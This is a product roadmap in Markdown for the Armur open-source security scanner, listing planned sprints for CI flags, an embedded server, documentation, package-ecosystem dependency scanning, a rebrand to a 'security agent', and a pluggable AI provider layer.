#### 10.4 CI-Friendly Exit Codes & Flags

- [ ] `--fail-on-severity <level>` flag for `armur run` and `armur scan`:
  - If any finding at or above the given severity level is found: exit code 1
  - Valid levels: `critical`, `high`, `medium`, `low` (default: disabled)
- [ ] `--min-severity <level>` flag: suppress display of findings below the given level
- [ ] `--quiet` / `-q` flag: suppress all output except the summary card and exit code
- [ ] Add a GitHub Actions workflow snippet to README showing a CI step that fails on HIGH findings

---

### Sprint 11 — Embedded Server & Zero-Infrastructure Mode

Currently using `armur` requires Docker, Redis, and a separately running server. For local developer
use, the CLI should be able to start everything it needs without any external services.

#### 11.1 `armur serve` Command

- [ ] Add `armur serve` as a top-level command that starts the Go HTTP server in the foreground
- [ ] Accept `--port` flag (default: 4500) and `--redis-url` flag
- [ ] On start: print `Armur server listening at http://localhost:4500 (press Ctrl+C to stop)`
- [ ] Graceful shutdown on SIGINT/SIGTERM: drain in-flight Asynq tasks (with timeout), close Redis, exit

#### 11.2 Embedded Redis for Local Use

- [ ] Evaluate and integrate `github.com/alicebob/miniredis` (in-process Redis-compatible server) for local mode
- [ ] When `armur run` detects no external Redis and the user confirms local mode: start miniredis in-process
- [ ] Local mode uses miniredis; production/Docker mode uses real Redis — controlled by `ARMUR_LOCAL=true` env var or `--local` flag

#### 11.3 Auto-Server in `armur run`

- [ ] Before submitting a scan task, check if the configured API URL responds to `/health`
- [ ] If unreachable and `--no-server` is not set: prompt "No server found. Start a local server? (Y/n)"
- [ ] If confirmed: launch `armur serve` as a managed subprocess (store PID), wait for `/health` to respond (timeout 10s), then proceed with the scan
- [ ] On scan completion: print "Local server still running (PID 12345). Stop it with: armur serve stop"
- [ ] `armur serve stop` — send SIGTERM to the stored PID, wait for clean exit

#### 11.4 In-Process Scan Mode (No Server at All)

- [ ] Add `--in-process` flag to `armur run` — runs the scan pipeline directly in the CLI process, no HTTP round-trip
- [ ] The CLI imports the server's `internal/tasks` package and calls `RunSimpleScan` / `RunAdvancedScans` directly
- [ ] Progress events emitted via the same `ProgressReporter` interface; TUI receives them through a local channel instead of SSE
- [ ] This enables `armur run --in-process` to work with zero external dependencies (no Docker, no Redis, no server)
- [ ] Requires the scan tools themselves to be installed on the host machine (show `armur doctor` output if any are missing)

---

### Sprint 12 — Community & Open Source Health

#### 12.1 CI/CD for the Repo Itself
- [ ] Add `.github/workflows/test.yml` — run `go test ./...` on every PR
- [ ] Add `.github/workflows/lint.yml` — run `golangci-lint` on every PR
- [ ] Add `.github/workflows/docker.yml` — build and push Docker image on merge to main
- [ ] Add `.github/workflows/release.yml` — create GitHub Release with binaries on tag push
- [ ] Add `.github/workflows/security.yml` — run Armur on itself (dogfood)

#### 12.2 Cross-Platform Releases
- [ ] Add `goreleaser` configuration
- [ ] Build binaries for: `linux/amd64`, `linux/arm64`, `darwin/amd64`, `darwin/arm64`, `windows/amd64`
- [ ] Publish to GitHub Releases on every semver tag
- [ ] Add Homebrew formula (`brew install armur-ai/tap/armur`)
- [ ] Add `install.sh` one-liner script

#### 12.3 Versioning & Changelog
- [ ] Add semantic versioning (`MAJOR.MINOR.PATCH`)
- [ ] Embed version string in binary (`ldflags -X main.version`)
- [ ] Add `armur version` command
- [ ] Create `CHANGELOG.md` following Keep a Changelog format
- [ ] Automate changelog generation from conventional commits

#### 12.4 Issue & PR Templates
- [ ] Add `.github/ISSUE_TEMPLATE/bug_report.md`
- [ ] Add `.github/ISSUE_TEMPLATE/feature_request.md`
- [ ] Add `.github/ISSUE_TEMPLATE/new_tool_request.md`
- [ ] Add `.github/PULL_REQUEST_TEMPLATE.md` with checklist (tests, docs, changelog)
- [ ] Add `.github/SECURITY.md` for responsible disclosure process

#### 12.5 Contributing Guide
- [ ] Add `CONTRIBUTING.md` with:
  - [ ] How to set up dev environment without Docker
  - [ ] How to add a new tool integration (step-by-step with example)
  - [ ] How to add a new language
  - [ ] Code style and conventions
  - [ ] How to run tests
  - [ ] PR review process

#### 12.6 README Improvements
- [ ] Add build status badge (GitHub Actions)
- [ ] Add test coverage badge (Codecov or similar)
- [ ] Add Go Report Card badge
- [ ] Add Docker pulls badge
- [ ] Add license badge
- [ ] Add a demo GIF/video showing CLI in action
- [ ] Add "Supported Languages" table with tool counts per language
- [ ] Add "Quick Start" section that works in under 60 seconds

#### 12.7 Documentation Site
- [ ] Add "Getting Started" guide (5-minute quickstart)
- [ ] Add "Tool Reference" page documenting every integrated tool
- [ ] Add "CI/CD Integration" guides (GitHub Actions, GitLab CI, Jenkins, CircleCI)
- [ ] Add "Configuration Reference" (all `.armur.yml` options)
- [ ] Add "Plugin Development" guide
- [ ] Add "API Reference" (expand current Swagger docs)
- [ ] Deploy docs site to GitHub Pages or Vercel

---

### Sprint 13 — Documentation, README & CLI Reference

Documentation is a first-class product. A developer who can't figure out how to use a tool in
5 minutes will not use it. This sprint treats every doc as a user-facing feature and ensures
Armur's documentation is best-in-class — better than Semgrep's, better than Snyk's.

#### 13.1 README Complete Rewrite

The current README is minimal. Rewrite it as the primary marketing and onboarding document.

- [ ] **Header section**:
  - Project logo (SVG, dark + light mode variants)
  - One-line tagline: "The open-source security scanner that covers everything — SAST, SCA, secrets, IaC, containers, and more."
  - Badge row: build status · test coverage · Go Report Card · Docker pulls · license · Armur score · latest release
  - Animated asciinema demo GIF embedded directly in the README (shows `armur run .` from zero to findings in 30 seconds)

- [ ] **Quick Start section** (works end-to-end in a single terminal session):
  ```bash
  # Install
  brew install armur-ai/tap/armur           # macOS/Linux
  # or: npm install -g @armur/cli           # via npm
  # or: curl -fsSL https://install.armur.ai | sh  # universal

  # Scan your project (no config needed)
  cd your-project
  armur run .

  # Scan a GitHub repository
  armur run https://github.com/org/repo

  # Check dependencies only
  armur run . --sca-only

  # Scan a Docker image
  armur scan --image nginx:latest
  ```

- [ ] **What Armur detects** — visual grid showing all categories with icons:
  | Category | Description | Example Tools |
  |----------|-------------|---------------|
  | SAST | Code vulnerabilities | semgrep, gosec, bandit, eslint |
  | SCA | Vulnerable dependencies | osv-scanner, govulncheck, cargo-audit |
  | Secrets | Hardcoded credentials | gitleaks, trufflehog |
  | IaC | Cloud misconfigs | tfsec, checkov, kube-linter |
  | Containers | Image vulnerabilities | trivy, grype |
  | DAST | Runtime exploitability | zap, nuclei |
  | Mobile | APK/IPA analysis | mobsf, apkleaks |

- [ ] **Language support matrix** — table of every supported language with tool names and coverage level (✓ full / ~ partial / planned):
  | Language | SAST | SCA | Secrets | Quality |
  |----------|------|-----|---------|---------|
  | Go | ✓ | ✓ | ✓ | ✓ |
  | Python | ✓ | ✓ | ✓ | ✓ |
  | ... etc |

- [ ] **Command reference summary** — all top-level commands in one table:
  | Command | Description |
  |---------|-------------|
  | `armur run [target]` | Scan with interactive TUI (recommended) |
  | `armur scan [target]` | Non-interactive scan |
  | `armur explain <id>` | AI explanation of a finding |
  | `armur fix <id>` | AI-generated code patch |
  | `armur doctor` | Check prerequisites |
  | `armur history` | Browse past scans |
  | `armur report <format>` | Generate reports |
  | `armur rules` | Manage detection rules |
  | `armur setup <integration>` | Configure integrations |
  | `armur serve` | Start local server |
  | `armur mcp` | Start MCP server for AI editors |

- [ ] **CI/CD integration snippets** — ready-to-paste code blocks for the 5 most common CI systems
- [ ] **How it works** — 4-step architecture diagram (ASCII art or SVG): Code → Tools → Results → Report
- [ ] **FAQ section** in the README (top 5 most-asked questions with short answers):
  - "Does Armur send my code anywhere?" → No. Everything runs locally by default.
  - "Do I need Docker?" → No. `armur run --in-process` works with zero infrastructure.
  - "How is Armur different from Semgrep/Snyk?" → One tool that covers all categories; MCP integration; better TUI.
  - "Can I use it in CI without a server?" → Yes. Use `armur scan --in-process`.
  - "Is it free?" → Yes. MIT license. Armur Cloud has a free tier for open source.
- [ ] **Contributing** and **License** sections at the bottom
- [ ] Keep README under 500 lines — use "Read the docs" links for detail rather than embedding everything

#### 13.2 CLI Command Reference (In-Tool `--help` + Online Docs)

Every command and flag must be self-documenting inside the tool itself, not just in external docs.

- [ ] **Rich `--help` output for every command** — include:
  - Short description (one line)
  - Full description (2–3 sentences explaining when to use this command)
  - At least 3 usage examples with real-world scenarios
  - Flag descriptions that explain *why* you'd use the flag, not just what it does
  - Link to online docs at the bottom: `Docs: https://docs.armur.ai/cli/<command>`

  Example for `armur run`:
  ```
  armur run — Scan a target with the full interactive TUI experience

  Opens a multi-step wizard to configure your scan, then shows a live progress
  dashboard while tools run, and an interactive results browser when complete.
  This is the recommended entry point for all new users.

  Usage:
    armur run [target] [flags]

  Arguments:
    target    File, directory, or git URL to scan.
              Defaults to the current directory if omitted.

  Examples:
    armur run                          # scan current directory (auto-detects everything)
    armur run ./my-project             # scan a specific directory
    armur run https://github.com/org/repo  # scan a remote repository
    armur run . --depth deep           # deep scan with all tools
    armur run . --diff HEAD~1          # scan only files changed since last commit
    armur run . --sca-only             # dependency vulnerabilities only
    armur run . --fail-on-severity high  # exit 1 if any HIGH+ findings (for CI)

  Flags:
    -d, --depth string          Scan depth: quick (default) or deep
    -l, --language string       Override auto-detected language
        --diff string           Only scan files changed since this git ref
        --sca-only              Run SCA (dependency) tools only
        --dast-url string       Also run DAST scan against this URL
        --fail-on-severity      Exit 1 if findings at or above this level
        --min-severity string   Hide findings below this level in output
        --output string         Output format: text (default), json, sarif
        --save-report           Save report to ~/.armur/reports/
        --in-process            Run without a server (no Docker/Redis needed)
        --offline               Disable all external network calls
        --watch                 Re-scan on file changes

  Docs: https://docs.armur.ai/cli/run
  ```

- [ ] Apply the same rich `--help` treatment to all commands:
  - [ ] `armur scan` — non-interactive version with all flags documented + examples
  - [ ] `armur explain <id>` — with example output shown in --help
  - [ ] `armur fix <id>` — document --apply, --pr, --verify flags with examples
  - [ ] `armur doctor` — explain what each check does in --help
  - [ ] `armur history` / `armur history show` / `armur history clear`
  - [ ] `armur compare <id1> <id2>`
  - [ ] `armur report html|csv|markdown|pdf|sarif|owasp|pci|cwe`
  - [ ] `armur rules list|install|update|remove|create|test|validate`
  - [ ] `armur setup <integration>`
  - [ ] `armur serve` / `armur serve stop`
  - [ ] `armur mcp` — explain MCP protocol and link to integration guides
  - [ ] `armur config` — document every key with allowed values and defaults
  - [ ] `armur init` — explain every generated .armur.yml field
  - [ ] `armur sla report|stats`
  - [ ] `armur debt`
  - [ ] `armur scorecard`
  - [ ] `armur sbom`
  - [ ] `armur badge generate`
  - [ ] `armur version --check`

- [ ] **`armur help` interactive browser** — when `armur help` is run with no args, show a
  Bubbletea-powered searchable list of all commands with descriptions; press Enter to expand
  the full help for that command

#### 13.3 docs.armur.ai — The Documentation Site

Full reference docs deployed at `docs.armur.ai`. Every page must be accurate, copyable, and searchable.

- [ ] **Getting Started** (5-minute quickstart):
  - [ ] Page 1: Installation (all methods: brew, npm, pip, curl, Docker, from source)
  - [ ] Page 2: First scan — `cd my-project && armur run .` with annotated screenshot of TUI output
  - [ ] Page 3: Understanding results — what each category means, what to fix first
  - [ ] Page 4: Setting up CI — paste-ready GitHub Actions snippet
  - [ ] Page 5: What's next — links to deeper topics

- [ ] **CLI Reference** (auto-generated from cobra's command tree + hand-written examples):
  - One page per top-level command
  - Each page: description, usage syntax, all flags with types/defaults, 5+ examples, related commands
  - Examples use real-world scenarios, not toy inputs
  - Include expected output (truncated) for each example

- [ ] **Configuration Reference** (`.armur.yml` full spec):
  - Every field documented with: type, default, description, example value, which sprint introduced it
  - Organized by section: `scan`, `tools`, `exclude`, `output`, `secrets`, `licenses`, `sla`, `never-allow`, `plugins`, `dast`, `ai`
  - Full annotated example `.armur.yml` at the top of the page
  - JSON Schema for `.armur.yml` published at `docs.armur.ai/schema/armur.json` (enables IDE autocompletion)

- [ ] **Tool Reference** — one page per integrated tool (18 initial + all additions):
  - Tool name, homepage, license, version requirement
  - What it detects (with example findings)
  - Which languages it supports
  - How Armur invokes it (the exact command)
  - How to install it manually (for non-Docker deployments)
  - Known limitations and false positive patterns
  - Link to the tool's own documentation

- [ ] **Language Support Guide** — one page per supported language:
  - Which tools run for this language in quick vs deep mode
  - Which SCA ecosystems are supported
  - Setup requirements (e.g. Java needs a JDK to compile before SpotBugs can run)
  - Example `.armur.yml` for this language
  - Sample findings from real projects in this language

- [ ] **IaC & Container Reference** — per-platform pages for Terraform, CloudFormation, Kubernetes, Helm, Dockerfile, etc.

- [ ] **Integrations** — per-integration pages:
  - Claude Code (MCP), Cursor, Windsurf, Claude Desktop
  - VS Code extension
  - GitHub Actions, GitLab CI, CircleCI, Jenkins, Azure DevOps, Bitbucket
  - Slack, Teams, Jira, Linear
  - Pre-commit hook, Husky
  - Armur Cloud

- [ ] **API Reference** — rendered OpenAPI spec:
  - Use Scalar (modern, beautiful) or Redoc for rendering
  - Every endpoint documented with: description, request body, response schema, example cURL call, example response
  - Include authentication section with example API key setup

- [ ] **Architecture Guide** (for contributors and self-hosters):
  - System diagram: CLI → API server → Asynq worker → tool executors → Redis → result store
  - How a scan flows through the system end-to-end
  - How the MCP server works
  - How SSE streaming works
  - Data model: Finding, ScanTask, ScanResult

- [ ] **Deployment Guide**:
  - Docker Compose (quickest — current method)
  - Docker Compose in production (with reverse proxy, TLS, secrets management)
  - Kubernetes deployment with Helm chart
  - Air-gapped / offline deployment
  - High-availability setup (multiple workers, Redis Sentinel)
  - Environment variable reference (every `ARMUR_*` env var documented)

- [ ] **Security Model** page — how Armur handles code security itself:
  - What runs locally vs what goes to cloud
  - How API keys are stored
  - Network calls made during a scan (with `--offline` flag behavior)
  - How to run in fully air-gapped mode
  - Armur's own security posture (we dogfood our own scanner)

#### 13.4 Cookbook — Common Workflows as Recipes

Short, copy-paste-ready guides for common real-world scenarios. Each recipe is one page.

- [ ] **Recipe: Secure a Node.js API before launch** — quick scan + SCA + secrets + DAST
- [ ] **Recipe: Add security to a Go microservice** — gosec + govulncheck + trivy in CI
- [ ] **Recipe: Scan a monorepo with 5 services** — `armur run --monorepo` walkthrough
- [ ] **Recipe: Block a PR with high security findings** — GitHub Actions gate setup
- [ ] **Recipe: Find leaked secrets in git history** — `armur scan --history` walkthrough
- [ ] **Recipe: Scan Terraform before `terraform apply`** — pre-apply security gate
- [ ] **Recipe: Audit your Docker image before pushing** — `armur scan --image` workflow
- [ ] **Recipe: Set up weekly security reports via Slack** — scheduled scan + Slack webhook
- [ ] **Recipe: Use Armur in Claude Code for secure coding** — MCP setup walkthrough
- [ ] **Recipe: Fix all CRITICAL findings with AI** — `armur fix --all --severity critical --apply`
- [ ] **Recipe: Migrate from Snyk to Armur** — Snyk → Armur workflow mapping
- [ ] **Recipe: Generate an SBOM for a compliance audit** — `armur sbom` + Dependency-Track
- [ ] **Recipe: Set up SLA enforcement for your team** — SLA config + Slack breach notifications
- [ ] **Recipe: Scan a smart contract before deployment** — Solidity + Slither + Mythril walkthrough

#### 13.5 Migration Guides

Developers switching from other tools need a bridge. These guides show exactly how to map
their existing workflow to Armur.

- [ ] **Migrating from Semgrep**:
  - Comparison table: Semgrep concepts → Armur equivalents
  - How to import your existing Semgrep rules into Armur (`armur rules import --from semgrep`)
  - Feature coverage comparison (what Armur adds that Semgrep doesn't: SCA, secrets, IaC, TUI)
  - Side-by-side CLI comparison: `semgrep scan .` vs `armur run .`

- [ ] **Migrating from Snyk**:
  - Snyk vs Armur: what Snyk does that Armur covers, and vice versa
  - Mapping Snyk severity levels to Armur severity levels
  - How to reproduce Snyk's `snyk test` and `snyk code test` with Armur
  - Cost comparison: Snyk Enterprise ($) vs Armur (free + Armur Cloud)

- [ ] **Migrating from SonarQube**:
  - Mapping SonarQube quality gates → Armur `fail-on-severity` and `never-allow`
  - How to replicate SonarQube's language coverage with Armur
  - Self-hosted comparison: SonarQube (JVM + Elasticsearch) vs Armur (Go + Redis — much simpler)

- [ ] **Migrating from Trivy (standalone)**:
  - Trivy is already integrated inside Armur — show how `armur run .` supersedes `trivy fs .`
  - How Armur adds SAST + secrets + IaC on top of what Trivy provides

- [ ] **Migrating from Checkov**:
  - Checkov is already integrated inside Armur — show how `armur run .` supersedes `checkov -d .`
  - What Armur adds: SAST, SCA for application code, secrets, TUI, reports

#### 13.6 Troubleshooting Guide

- [ ] **Common error messages** — every error Armur can print, with cause and fix:
  - "Connection refused: http://localhost:4500" → server not running, use --in-process
  - "Tool not found: gosec" → install instructions per OS
  - "Language detection failed" → how to specify --language manually
  - "Redis connection failed" → Redis not running, use embedded mode
  - "Scan timeout" → increase TOOL_TIMEOUT_SECONDS, or use --depth quick
  - "Permission denied cloning repository" → SSH key or token setup instructions

- [ ] **Performance troubleshooting**:
  - Scan taking > 5 minutes → which tools are slow and why, how to skip them
  - High memory usage → MAX_TOOL_CONCURRENCY tuning
  - Disk space issues → temp directory cleanup instructions

- [ ] **CI/CD troubleshooting**:
  - Why GitHub Actions fails on rate limits (solution: cache tool installations)
  - Why SARIF upload fails (common: file size limit, path issues)
  - Why the scan works locally but fails in CI (environment differences)

- [ ] **False positive management**:
  - How to identify false positives vs genuine findings
  - How to suppress with inline comments vs `.armur.yml` vs global suppression
  - How to report a false positive to the Armur team

#### 13.7 CHANGELOG.md & Release Notes

- [ ] Create `CHANGELOG.md` at repo root following [Keep a Changelog](https://keepachangelog.com) format:
  ```markdown
  # Changelog

  All notable changes to Armur Code Scanner are documented here.
  Format: Keep a Changelog (https://keepachangelog.com)
  Versioning: Semantic Versioning (https://semver.org)

  ## [Unreleased]
  ### Added
  - ...

  ## [1.0.0] — 2026-XX-XX
  ### Added
  - Initial release with Go, Python, and JavaScript/TypeScript support
  - 18 integrated security tools
  - REST API + Asynq worker architecture
  ...
  ```
- [ ] Automate CHANGELOG generation from conventional commits using `git-cliff` or `release-please`
- [ ] Each GitHub Release includes:
  - What's new (bullet points from CHANGELOG)
  - Breaking changes (prominently highlighted)
  - Migration steps for breaking changes
  - SHA256 checksums for all binaries
  - Docker image digest

#### 13.8 In-Code Documentation Standards

These apply to all code written going forward, ensuring future contributors understand the codebase.

- [ ] Every exported function in `internal/tools/` must have a godoc comment explaining:
  - What the tool does
  - What it returns
  - What errors it can return
  - Example: `// RunGosec runs the gosec static analyzer against the given directory and returns categorized security findings. Returns ErrToolNotFound if gosec is not installed.`
- [ ] Every tool wrapper file must have a package-level comment with:
  - Tool name and homepage URL
  - Version requirement (minimum version tested)
  - Installation instructions for the tool itself
- [ ] `internal/models/finding.go` — every field of the `Finding` struct must have an inline comment
- [ ] `internal/api/types.go` — every API request/response struct field must have a `json` tag + godoc comment (used for OpenAPI generation)
- [ ] Run `golint ./...` and `godoc ./...` in CI to enforce comment coverage
- [ ] Generate HTML godoc and publish to `pkg.go.dev/github.com/armur-ai/armur-codescanner`

---

### Sprint 14 — Software Composition Analysis: All Ecosystems

Expand SCA coverage from the current (Go modules + generic OSV) to every major package ecosystem.
Goal: comprehensive dependency vulnerability detection regardless of language.

#### 14.1 Package Ecosystem Coverage Matrix

For each ecosystem: detect the manifest/lockfile, parse direct + transitive dependencies, query OSV API for CVEs.

- [ ] **npm / Yarn / pnpm** (JavaScript/TypeScript):
  - Detect: `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
  - Run: `npm audit --json` or `osv-scanner --lockfile=package-lock.json:npm`
  - Parse: vulnerability ID, package name, installed version, patched version, CVSS
- [ ] **pip / Poetry / Pipenv / PDM / uv** (Python):
  - Detect: `requirements.txt`, `Pipfile.lock`, `poetry.lock`, `pdm.lock`, `uv.lock`, `pyproject.toml`
  - Run: `osv-scanner --lockfile=requirements.txt:pip`; also `pip-audit --format json`
  - Add `pip-audit` integration (Google's official Python auditing tool)
- [ ] **Go modules** (already have osv-scanner + govulncheck — improve):
  - Detect: `go.mod`, `go.sum`
  - Run both govulncheck (reachability-aware) and osv-scanner (all deps including non-reachable)
  - Display reachability status in findings: "reachable: yes | no | unknown"
- [ ] **Cargo** (Rust):
  - Detect: `Cargo.toml`, `Cargo.lock`
  - Run: `cargo audit --json`
- [ ] **Maven / Gradle** (Java/Kotlin/Scala):
  - Detect: `pom.xml`, `build.gradle`, `build.gradle.kts`, `gradle.lockfile`
  - Run: `mvn dependency:tree -DoutputType=dot` + osv-scanner; or OWASP Dependency-Check
- [ ] **RubyGems** (Ruby):
  - Detect: `Gemfile.lock`
  - Run: `bundle-audit check --json`
- [ ] **Composer** (PHP):
  - Detect: `composer.lock`
  - Run: `local-php-security-checker --format=json`
- [ ] **NuGet** (C#/.NET):
  - Detect: `packages.config`, `packages.lock.json`, `*.csproj` with `<PackageReference>`
  - Run: `dotnet list package --vulnerable --include-transitive --format json`
- [ ] **CocoaPods** (iOS/macOS):
  - Detect: `Podfile.lock`
  - Run: `osv-scanner --lockfile=Podfile.lock:cocoapods`
- [ ] **Swift Package Manager**:
  - Detect: `Package.resolved`
  - Run: `osv-scanner --lockfile=Package.resolved:swift`
- [ ] **pub** (Dart/Flutter):
  - Detect: `pubspec.lock`
  - Run: `dart pub audit` (official Dart advisory checking)
- [ ] **Hex** (Elixir):
  - Detect: `mix.lock`
  - Run: `mix hex.audit` — parse output for vulnerable packages
- [ ] **Conan** (C/C++):
  - Detect: `conanfile.txt`, `conanfile.py`, `conan.lock`
  - Query OSV API with package names and versions
- [ ] **sbt** (Scala):
  - Detect: `build.sbt`, `project/plugins.sbt`
  - Run: `sbt dependencyUpdates` + OSV API query

#### 14.2 OSV API Integration (Unified Vulnerability Database)

- [ ] Implement a shared `internal/sca/osv.go` OSV API client:
  - `BatchQuery(pkgs []Package) ([]Vulnerability, error)` — uses OSV `/v1/querybatch` endpoint
  - Cache results in Redis for 1 hour to avoid redundant API calls
  - Rate-limit: max 100 packages per batch request
- [ ] Map OSV vulnerability severities using CVSS v3 base score: ≥9.0 → Critical, ≥7.0 → High, ≥4.0 → Medium, <4.0 → Low
- [ ] Enrich each SCA finding with: CVE IDs, GHSA IDs, PURL, affected version range, fixed version, CVSS score, summary

---

## Phase 3: The Agent Edge (v2.0) — Sprints 15–21

The transformation from code scanner to security agent. AI intelligence, sandboxed DAST,
exploit simulation, attack path analysis, autonomous PR review, and MCP integration for
AI coding assistants. This is what makes Armur fundamentally different from every other scanner.

---

### Sprint 15 — Rebranding: From Code Scanner to Personal Security Agent

The fundamental identity shift. Armur is no longer just a "code scanner" — it is a **Personal
Security Agent for developers** that continuously watches, tests, and protects code. This sprint
touches naming, messaging, packaging, CLI UX, and structural architecture to align with the new
positioning. The key insight: AI-generated code is becoming the norm, and developers need an agent
that automatically validates every change — not a tool they remember to run manually.

#### 15.1 Name & Identity

- [ ] Rename the project from "Armur Code Scanner" to **"Armur — Personal Security Agent"**
  - GitHub repo description: "Your personal security agent. SAST + DAST + exploit simulation + attack path analysis — all automated."
  - Short form for docs and marketing: "Armur Security Agent" or just "Armur"
  - CLI binary stays `armur` (no change needed)
- [ ] Update `cmd/server/main.go` Swagger title: `Armur Security Agent API`
- [ ] Update `cli/cmd/root.go` description:
  ```go
  Short: "Armur — Your Personal Security Agent",
  Long:  "Armur is a personal security agent that reads your code, runs it in a sandbox, simulates attacks, and shows you exactly how to fix what it finds.",
  ```
- [ ] Update all `--help` text across every command to use "agent" language instead of "scanner"
- [ ] Create `assets/logo/` with new logo variants (text-only, icon, banner) for README and docs
- [ ] Update `IMPROVEMENTS.md` header to "Armur Security Agent — Improvement Roadmap"

#### 15.2 Go Module & Package Naming

- [ ] Rename Go module from `armur-codescanner` to `armur` in `go.mod`
- [ ] Rename CLI module from `armur-cli` to `armur-cli` (keep as-is — it's fine)
- [ ] Update all internal import paths: `armur-codescanner/internal/...` → `armur/internal/...`
- [ ] Update Docker image names: `armur/scanner` → `armur/agent` (keep `armur/scanner` as alias)
- [ ] Update GitHub Actions references: `armur-ai/armur-scan-action` → `armur-ai/armur-action`

#### 15.3 CLI Experience: Agent-First UX

- [ ] New default behavior: `armur` with no args → runs the security agent in watch mode for cwd
  - Performs initial scan, then watches for file changes
  - On each change: re-scans affected files, shows delta findings
  - Agent stays running until Ctrl+C
- [ ] `armur scan` still works as a one-shot command (backwards compatible)
- [ ] `armur agent` — explicit alias for the always-on agent mode
- [ ] `armur review <pr-url>` — review a specific PR (Sprint 20)
- [ ] New CLI banner on startup:
  ```
  ╔═══════════════════════════════════════════════╗
  ║  ARMUR — Personal Security Agent              ║
  ║  Watching: ./my-project (Go)                  ║
  ║  Mode: SAST + SCA | Press 'd' for DAST       ║
  ╚═══════════════════════════════════════════════╝
  ```
- [ ] All output uses "agent" framing: "Armur found 3 issues" not "Scan found 3 issues"

#### 15.4 Messaging & Positioning Throughout Codebase

- [ ] Update every user-facing string that says "scan" to use "analysis" or "security check" where appropriate
  - API responses: `"status": "analyzing"` alongside existing `"status": "pending"` for backwards compat
  - CLI output: "Armur is analyzing your code..." instead of "Waiting for scan to complete..."
- [ ] Update error messages to be agent-contextual: "Armur couldn't reach the server" not "Error making API request"
- [ ] Update all `.armur.yml` documentation to frame as "agent configuration" not "scan configuration"
- [ ] Add a `--why` flag to every finding display: shows a one-sentence explanation of why this matters specifically for AI-generated code

#### 15.5 Structural Preparation

- [ ] Add `Finding.Source` field across the pipeline: `"sast"` | `"dast"` | `"sca"` | `"secrets"` | `"iac"` | `"exploit"` | `"attack_path"`
- [ ] Add `Finding.Confirmed` boolean: `true` when DAST or exploit simulation has verified the finding
- [ ] Add `ScanMode` enum: `"sast_only"` | `"sast_sca"` | `"full_agent"` (SAST + DAST + exploit)
- [ ] Extend `.armur.yml` schema with agent config section:
  ```yaml
  agent:
    mode: full            # sast_only | sast_sca | full_agent
    auto_dast: true       # automatically run DAST when a runnable app is detected
    auto_exploit: false   # automatically simulate exploits (opt-in, requires sandbox)
    watch: true           # watch for file changes and re-analyze
    pr_review: true       # automatically review PRs when integrated with GitHub
  ```
- [ ] Add `internal/agent/` package as the top-level orchestrator that coordinates SAST → DAST → Exploit → Attack Path

---

### Sprint 16 — AI Intelligence Layer (Claude API + Local LLMs)

Every intelligent feature in Armur (tech stack detection, exploit generation, attack path reasoning,
PR review, explain, fix, false positive reduction) requires an AI backbone. This sprint builds the
pluggable AI integration layer that supports Claude API, local LLMs via Ollama, and user choice.

#### 16.1 AI Provider Abstraction

- [ ] Create `internal/ai/provider.go` — defines the provider interface:
  ```go
  type AIProvider interface {
      Complete(ctx context.Context, prompt string, opts CompletionOpts) (string, error)
      Stream(ctx context.Context, prompt string, opts CompletionOpts) (<-chan string, error)
      Name() string
      Available() bool
  }

  type CompletionOpts struct {
      MaxTokens   int
      Temperature float64
      SystemPrompt string
  }
  ```
- [ ] Implement `internal/ai/claude.go` — Claude API provider:
  - Uses `github.com/anthropic-ai/anthropic-sdk-go` (official Go SDK)
  - Default model: `claude-sonnet-4-6` for speed; `claude-opus-4-6` for complex reasoning (exploit gen)
  - Reads API key from: `ANTHROPIC_API_KEY` env var → `~/.armur/config.json` → prompt user
- [ ] Implement `internal/ai/ollama.go` — Ollama local LLM provider:
  - Connects to Ollama HTTP API at `http://localhost:11434`
  - Default model: `llama3.1:8b` (good balance of speed and quality)
  - Auto-detect if Ollama is running; if not, offer to install it
- [ ] Implement `internal/ai/openai_compat.go` — any OpenAI-compatible API endpoint (LM Studio, vLLM, Together.ai, Groq):
  - Config: `ARMUR_LLM_BASE_URL`, `ARMUR_LLM_API_KEY`, `ARMUR_LLM_MODEL`
- [ ] Implement `internal/ai/router.go` — provider router:
  - User configures preferred provider in `~/.armur/config.json` or `.armur.yml`
  - Fallback chain: user preference → Claude API (if key available) → Ollama (if running) → offline mode (no AI)
  - Each AI-powered feature specifies minimum capability level; router picks the best available provider

#### 16.2 User Configuration & Key Management

- [ ] `armur config set ai-provider claude` / `armur config set ai-provider ollama` / `armur config set ai-provider auto`
- [ ] `armur config set anthropic-api-key <key>` — securely stores the Claude API key
  - Key stored in `~/.armur/credentials` with `0600` permissions (not in `config.json`)
  - Support `ANTHROPIC_API_KEY` env var as override
- [ ] `armur config set ollama-model <model>` — configure which Ollama model to use (default: `llama3.1:8b`)
- [ ] `armur config set ollama-url <url>` — for remote Ollama instances (default: `http://localhost:11434`)
- [ ] Add `.armur.yml` AI configuration:
  ```yaml
  ai:
    provider: auto          # claude | ollama | auto | none
    claude:
      model: claude-sonnet-4-6
      # API key read from env or ~/.armur/credentials — never stored in .armur.yml
    ollama:
      model: llama3.1:8b
      url: http://localhost:11434
    features:
      explain: true         # enable armur explain
      fix: true             # enable armur fix
      fp_filter: false      # enable false positive filtering
      exploit_gen: true     # enable exploit generation (requires claude or large local model)
      tech_detection: true  # enable AI-powered tech stack detection for DAST
  ```

#### 16.3 Local LLM Bootstrap

- [ ] `armur setup ai` — interactive wizard for AI setup:
  1. "How would you like to power Armur's AI features?"
     - "Use Claude API (best quality, requires API key)" → prompt for key
     - "Use a local LLM via Ollama (free, private, runs on your machine)" → check/install Ollama
     - "No AI features (Armur works fine without them, just no explain/fix/exploit features)"
  2. If Ollama selected:
     - Check if Ollama is installed; if not: `brew install ollama` (macOS) or provide install link
     - Check if the selected model is downloaded; if not: `ollama pull llama3.1:8b`
     - Run a quick test prompt to verify the model works
     - Save config
  3. Print summary: "AI configured! Armur will use [Claude API / Ollama llama3.1:8b] for intelligent features."
- [ ] `armur doctor` extended: check AI provider health (API key valid, Ollama reachable, model loaded)

#### 16.4 AI-Powered Tech Stack Detection

- [ ] Create `internal/ai/techdetect.go` — uses AI to analyze a project and determine:
  - Primary language and framework (e.g., "Go + Gin", "Python + FastAPI", "Node.js + Express")
  - Build system (go build, npm, pip, cargo, maven, gradle)
  - How to build the project (specific commands)
  - How to run the project (specific commands, ports, env vars needed)
  - Database dependencies (PostgreSQL, MySQL, Redis, MongoDB, etc.)
  - External service dependencies (S3, Stripe, Twilio, etc.)
- [ ] Input: project file listing + key file contents (go.mod, package.json, Dockerfile, docker-compose.yml, README)
